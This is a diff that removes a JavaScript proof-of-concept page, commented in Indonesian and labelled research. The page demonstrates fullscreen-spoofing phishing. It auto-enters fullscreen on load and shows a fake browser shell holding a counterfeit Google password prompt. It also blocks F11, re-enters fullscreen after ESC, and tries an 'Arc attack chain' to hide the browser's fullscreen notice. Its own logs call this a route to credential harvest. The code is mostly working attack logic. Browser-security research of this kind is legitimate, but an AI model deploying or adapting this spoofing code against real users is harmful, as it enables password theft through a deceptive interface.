-    log(7, `User klik Next (email: ${email || '[kosong]'}) — requesting fullscreen...`, 'info');
-    log(7, '→ Ini user gesture yang valid!', 'ok');
-
-    try {
-      // Enter fullscreen FROM the click handler — guaranteed user gesture
-      await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
-
-      // Show full fake browser shell with password step pre-loaded
-      showSpoof();
-      modal.remove();
-
-      // Update fake page content to show password step (user is mid-flow)
-      const pageContent = document.getElementById('fake-page-content');
-      if (pageContent) {
-        pageContent.innerHTML = `
-          <div style="max-width:420px;margin:0 auto;padding:44px 40px;background:white;border:1px solid #dadce0;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.08)">
-            <div style="text-align:center;margin-bottom:24px;">
-              <span style="font-size:24px;font-weight:300;">
-                <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
-              </span>
-            </div>
-            <h2 style="font-size:22px;font-weight:400;color:#202124;margin:0 0 8px">Welcome</h2>
-            <p style="font-size:14px;color:#5f6368;margin:0 0 24px">${email || 'user@gmail.com'}</p>
-            <input type="password" placeholder="Enter your password"
-              style="width:100%;padding:13px 14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box;margin-bottom:20px;"
-              autofocus>
-            <div style="display:flex;justify-content:space-between;align-items:center;">
-              <a href="#" style="color:#1a73e8;font-size:14px;text-decoration:none;" onclick="return false;">Forgot password?</a>
-              <button style="padding:10px 28px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;cursor:pointer;">Next</button>
-            </div>
-            <p style="text-align:center;margin-top:16px;font-size:11px;color:#f44336;">⚠ RESEARCH PoC — Notifikasi sudah fade di 913–1366ms lalu</p>
-          </div>`;
-      }
-
-      log(7, '✓ Fullscreen aktif! User sekarang diminta password', 'ok');
-      log(7, '→ Notifikasi "Press ESC" muncul selama ~1 detik tapi user fokus ngetik', 'warn');
-      log(7, '→ Setelah notifikasi hilang: UI terlihat identik dengan browser asli', 'ok');
-      log(7, '→ Ini chain: windowed phishing → fullscreen lock → credential harvest', 'ok');
-      setResult('formFirstStatus', 'Berhasil — notif ter-distract', 'vuln');
-    } catch(e) {
-      log(7, '✗ Fullscreen gagal: ' + e.message, 'err');
-    }
-  });
-}
-
-// ══════════════════════════════════════════════════════════════════════════
-// ARC ATTACK CHAIN
-// Khusus untuk Arc browser: pre-fullscreen + F11 block + Teknik 1 = 0 notifikasi
-// ══════════════════════════════════════════════════════════════════════════
-async function arcAttackChain() {
-  logArc('Memulai Arc Attack Chain...', 'info');
-
-  if (document.fullscreenElement) {
-    logArc('✓ Sudah dalam fullscreen (dari auto-init)', 'ok');
-    logArc('→ Memanggil requestFullscreen() LAGI dari state fullscreen...', 'info');
-    logArc('→ Di Arc: tidak akan muncul notifikasi origin!', 'ok');
-    logArc('→ Di Chrome/Firefox/Edge/Opera: notifikasi akan muncul lagi', 'warn');
-    try {
-      // Re-request fullscreen while already fullscreen
-      // Arc: no notification. Others: notification re-appears.
-      await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
-      showSpoof();
-      logArc('✓ requestFullscreen() berhasil dari fullscreen state', 'ok');
-      logArc('→ JIKA tidak ada notifikasi = ARC CONFIRMED VULNERABLE', 'ok');
-      logArc('→ JIKA notifikasi muncul = browser ini patched (bukan Arc behavior)', 'warn');
-      setResult('arcResult', 'Chain selesai — cek notif!', 'vuln');
-    } catch(e) {
-      logArc('✗ Error: ' + e.message, 'err');
-    }
-  } else {
-    logArc('⚠ Belum fullscreen! Meminta fullscreen sekarang...', 'warn');
-    logArc('→ Untuk hasil terbaik: buka halaman ini via klik dari halaman lain', 'info');
-    try {
-      await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
-      isFullscreenFromInit = true;
-      logArc('✓ Fullscreen pertama berhasil. Klik tombol ini LAGI untuk Arc test.', 'ok');
-    } catch(e) {
-      logArc('✗ Fullscreen gagal: ' + e.message, 'err');
-      logArc('→ Klik gate overlay terlebih dahulu untuk get user gesture', 'warn');
-    }
-  }
-}
-
-// ══════════════════════════════════════════════════════════════════════════
-// AUTO FULLSCREEN INIT
-// Dipanggil saat page load. Berhasil jika dibuka via link click (navigation activation).
-// Jika gagal: tampilkan gate overlay untuk mendapat user gesture.
-// ══════════════════════════════════════════════════════════════════════════
-async function autoFullscreenInit() {
-  setPill('pill-fs', '⏳ Mencoba auto-fullscreen...', 'pill-yellow');
-  try {
-    // Navigation transient activation: gestur dari klik link di halaman sebelumnya
-    // masih aktif selama beberapa detik setelah navigasi.
-    await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
-    isFullscreenFromInit = true;
-    setPill('pill-fs', '✅ FULLSCREEN AKTIF (auto)', 'pill-green');
-    // Gate tidak diperlukan — sembunyikan
-    const gate = document.getElementById('fs-gate');
-    if (gate) gate.style.display = 'none';
-    logArc('✓ Auto-fullscreen berhasil via navigation activation', 'ok');
-    logArc('→ F11 diblock, halaman dalam fullscreen. Klik "Arc Attack Chain" untuk lanjut.', 'info');
-  } catch(e) {
-    // Fallback: tampilkan gate untuk mendapat user gesture
-    setPill('pill-fs', '⚠ Perlu klik — buka gate', 'pill-yellow');
-    const gate = document.getElementById('fs-gate');
-    if (gate) gate.style.display = 'flex';
-    logArc('Auto-fullscreen gagal (' + e.message + ') — gate overlay ditampilkan', 'warn');
-    logArc('→ Klik "Lanjutkan" di gate untuk fullscreen via user gesture', 'info');
-  }
-}
-
-// Gate button handlers
-function initGate() {
-  const btn = document.getElementById('gate-continue-btn');
-  const cancel = document.getElementById('gate-cancel-btn');
-  if (!btn) return;
-
-  btn.addEventListener('click', async () => {
-    try {
-      await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
-      isFullscreenFromInit = true;
-      document.getElementById('fs-gate').style.display = 'none';
-      setPill('pill-fs', '✅ FULLSCREEN AKTIF (via gate)', 'pill-green');
-      logArc('✓ Fullscreen berhasil via gate click', 'ok');
-      logArc('→ Klik "Arc Attack Chain" untuk lanjut', 'info');
-    } catch(e) {
-      logArc('✗ Fullscreen gagal: ' + e.message, 'err');
-    }
-  });
-
-  cancel.addEventListener('click', () => {
-    document.getElementById('fs-gate').style.display = 'none';
-    setPill('pill-fs', '⬜ Gate ditutup — fullscreen tidak aktif', 'pill-gray');
-  });
-}
-
-// ─── Browser Detection ────────────────────────────────────────────────────
-function detectBrowser() {
-  const ua = navigator.userAgent;
-  let b = 'Unknown';
-  if (ua.includes('Edg/')) b = 'Edge ' + (ua.match(/Edg\/([\d.]+)/)||[])[1];
-  else if (ua.includes('OPR/')) b = 'Opera ' + (ua.match(/OPR\/([\d.]+)/)||[])[1];
-  else if (navigator.brave) b = 'Brave';
-  else if (ua.includes('Firefox/')) b = 'Firefox ' + (ua.match(/Firefox\/([\d.]+)/)||[])[1];
-  else if (ua.includes('Chrome/')) b = 'Chrome ' + (ua.match(/Chrome\/([\d.]+)/)||[])[1];
-  else if (ua.includes('Safari/')) b = 'Safari ' + (ua.match(/Version\/([\d.]+)/)||[])[1];
-  document.getElementById('detectBrowser').textContent = b;
-
-  // Fullscreen support check
-  if (!document.documentElement.requestFullscreen) {
-    setResult('notifStatus', 'Fullscreen tidak didukung', 'safe');
-  }
-}
-
-detectBrowser();
-initGate();
-autoFullscreenInit(); // Try fullscreen immediately on load
-
-// ─── Auto-activate F11 intercept on page load ─────────────────────────────
-// Tidak perlu klik tombol — langsung aktif saat halaman dibuka
-// Sehingga F11 sudah diblock sebelum user klik apapun
-(function autoF11Block() {
-  keyHandler = function(e) {
-    if (e.key === 'F11') {
-      e.preventDefault();
-      e.stopImmediatePropagation();
-      log(6, '⌨ F11 dicegah (auto-intercept aktif sejak page load)!', 'ok');
-      setResult('f11Status', 'BLOCKED ✓', 'vuln');
-    }
-    if (e.key === 'Escape' && document.fullscreenElement) {
-      log(6, '⌨ ESC terdeteksi — mencoba re-enter fullscreen...', 'warn');
-      clearTimeout(tech6ReenterTimeout);
-      tech6ReenterTimeout = setTimeout(() => {
-        if (!document.fullscreenElement) {
-          document.documentElement.requestFullscreen({ navigationUI: 'hide' })
-            .then(() => {
-              showSpoof();
-              log(6, '✓ Re-entered fullscreen setelah ESC!', 'ok');
-            })
-            .catch(err => {
-              log(6, '✗ Re-enter gagal: ' + err.message, 'err');
-            });
-        }
-      }, 100);
-    }
-  };
-  document.addEventListener('keydown', keyHandler, true);
-  keyInterceptActive = true;
-
-  // Update UI to reflect auto-active state
-  setResult('f11Status', 'Auto-aktif ✓', 'vuln');
-  // Log into log6 after DOM is ready
-  requestAnimationFrame(() => {
-    log(6, '✓ Keyboard intercept AUTO-AKTIF sejak page load', 'ok');
-    log(6, '→ F11 sudah diblok — coba tekan F11 sekarang', 'info');
-    log(6, '→ ESC intercept juga aktif (detect + coba re-enter)', 'info');
-  });
-})();
 </script>
 </body>
 </html>
